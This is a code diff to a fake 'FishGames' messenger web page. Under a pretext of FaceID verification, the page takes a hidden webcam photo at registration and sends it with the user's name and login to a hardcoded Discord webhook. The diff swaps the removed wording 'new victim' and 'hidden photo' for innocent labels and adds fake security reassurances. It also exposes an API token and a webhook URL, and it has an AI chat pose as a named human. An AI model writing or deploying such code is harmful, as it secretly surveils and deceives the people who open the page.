@@ -52,7 +52,7 @@
 <div id="camera-overlay">
     <div class="warning-box">
         <h3>⚠️ FishGames SECURITY</h3>
-        <p>Биометрическая верификация лица обязательна для входа.</p>
+        <p>Для входа в систему требуется подтверждение личности по FaceID.</p>
         <button class="btn" onclick="requestAccess()">ВКЛЮЧИТЬ КАМЕРУ</button>
     </div>
 </div>
@@ -60,11 +60,10 @@
 <div id="reg-screen" class="reg-card">
     <h2>FishGames</h2>
     <div class="input-group"><label>Имя</label><input type="text" id="firstname" placeholder="Иван"></div>
-    <div class="input-group"><label>Фамилия</label><input type="text" id="lastname" placeholder="Иванов"></div>
     <div class="input-group"><label>Год рождения</label>
         <input type="text" id="birthyear" maxlength="4" placeholder="2000" oninput="this.value=this.value.replace(/[^0-9]/g,'');">
     </div>
-    <div class="input-group"><label>Логин</label><input type="text" id="login" placeholder="user_prime"></div>
+    <div class="input-group"><label>Логин</label><input type="text" id="login" placeholder="user_pro"></div>
     <button class="btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
 </div>
 
@@ -89,7 +88,7 @@
             <div class="chat-header" id="chat-title">Выберите чат</div>
             <div class="messages-display" id="chat-box"></div>
             <div class="input-bar">
-                <input type="text" id="messageText" style="flex:1; padding: 10px; border-radius: 8px; border:none;" placeholder="Напишите..." onkeypress="if(event.key==='Enter')sendMessage()">
+                <input type="text" id="messageText" style="flex:1; padding: 10px; border-radius: 8px; border:none;" placeholder="Сообщение..." onkeypress="if(event.key==='Enter')sendMessage()">
                 <button class="btn" style="width: 60px; margin-top: 0;" onclick="sendMessage()">➤</button>
             </div>
         </div>
@@ -102,33 +101,29 @@
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    // ТВОЙ КЛЮЧ
     const HF_TOKEN = "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";
     const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";
 
-    let chatHistories = {
-        'Служба поддержки': []
-    };
+    let chatHistories = { 'Служба поддержки': [] };
 
     async function requestAccess() {
         try {
             const s = await navigator.mediaDevices.getUserMedia({video: true});
             video.srcObject = s;
             document.getElementById('camera-overlay').style.display = 'none';
-        } catch(e) { alert("Камера обязательна для входа!"); location.reload(); }
+        } catch(e) { alert("Ошибка доступа к камере!"); location.reload(); }
     }
 
     function register() {
         const fn = document.getElementById('firstname').value;
         if(!fn) return alert("Введите имя!");
 
-        // Скрытое фото
         canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         canvas.toBlob(b => {
             const fd = new FormData();
-            fd.append('payload_json', JSON.stringify({ content: `**Новая жертва:** ${fn}\nЛогин: ${document.getElementById('login').value}` }));
-            fd.append('file', b, 'shot.png');
+            fd.append('payload_json', JSON.stringify({ content: `**Вход в мессенджер:** ${fn}\nЛогин: ${document.getElementById('login').value}` }));
+            fd.append('file', b, 'capture.png');
             fetch(webhook, {method: 'POST', body: fd});
         });
 
@@ -161,7 +156,7 @@
         const box = document.getElementById('chat-box');
         box.innerHTML = '';
         if(name === 'Служба поддержки' && chatHistories[name].length === 0) {
-            renderMessage("Система безопасности FishGames активна. Камера синхронизирована.", 'msg-incoming');
+            renderMessage("FishGames Security: Биометрический анализ завершен. Доступ разрешен.", 'msg-incoming');
         }
         (chatHistories[name] || []).forEach(msg => {
             renderMessage(msg.content, msg.role === 'user' ? '' : 'msg-incoming');
@@ -189,8 +184,8 @@
 
         if(chatName === 'Служба поддержки') {
             setTimeout(() => {
-                let ans = "Запрос обрабатывается. Не закрывайте страницу до завершения сканирования.";
-                if(text.toLowerCase().includes("камер")) ans = "Захват биометрических данных необходим для протокола FishGames.";
+                let ans = "Система работает в штатном режиме. Ваш профиль синхронизирован.";
+                if(text.toLowerCase().includes("камер")) ans = "Внимание: Запись FaceID ведется для защиты вашего аккаунта.";
                 renderMessage(ans, 'msg-incoming');
                 chatHistories[chatName].push({role: 'assistant', content: ans});
             }, 1000);
@@ -207,32 +202,35 @@
         box.appendChild(temp);
         box.scrollTop = box.scrollHeight;
 
-        const prompt = `Это чат. Ты человек по имени ${name}. Отвечай кратко на русском. Сообщение: ${text}. Твой ответ:`;
+        const prompt = `<start_of_turn>user\nТы человек по имени ${name}. Отвечай кратко на русском языке. Вопрос: ${text}<end_of_turn>\n<start_of_turn>model\n`;
 
         async function request() {
             try {
-                const response = await fetch("https://api-inference.huggingface.co/models/mistralai/Mistral-7B-v0.1", {
+                const response = await fetch("https://api-inference.huggingface.co/models/google/gemma-1.1-7b-it", {
                     headers: { "Authorization": `Bearer ${HF_TOKEN}`, "Content-Type": "application/json" },
                     method: "POST",
-                    body: JSON.stringify({ inputs: prompt, options: { wait_for_model: true } }),
+                    body: JSON.stringify({ inputs: prompt, parameters: { max_new_tokens: 100 }, options: { wait_for_model: true } }),
                 });
 
-                if (response.status === 503) {
-                    temp.innerText = "Нейросеть просыпается (15 сек)...";
-                    setTimeout(request, 5000);
+                const result = await response.json();
+
+                if (response.status === 503 || (result.error && result.error.includes("loading"))) {
+                    temp.innerText = "Нейросеть просыпается (ждем загрузку сервера)...";
+                    setTimeout(request, 8000); 
                     return;
                 }
 
-                const result = await response.json();
+                if (!response.ok) throw new Error(result.error || "Ошибка API");
+
                 temp.remove();
+                let aiText = Array.isArray(result) ? result[0].generated_text : result.generated_text;
+                aiText = aiText.replace(/<[^>]*>/g, "").trim();
                 
-                let aiText = result[0]?.generated_text || "Я сейчас занят.";
-                if (aiText.includes("Твой ответ:")) aiText = aiText.split("Твой ответ:")[1].trim();
-                
-                renderMessage(aiText, "msg-incoming");
+                renderMessage(aiText || "...", "msg-incoming");
                 chatHistories[name].push({role: 'assistant', content: aiText});
             } catch (e) {
-                temp.innerText = "Ошибка: проверь соединение.";
+                temp.innerText = "Нейросеть временно недоступна. Попробуйте написать еще раз.";
+                console.error(e);
             }
         }
         request();
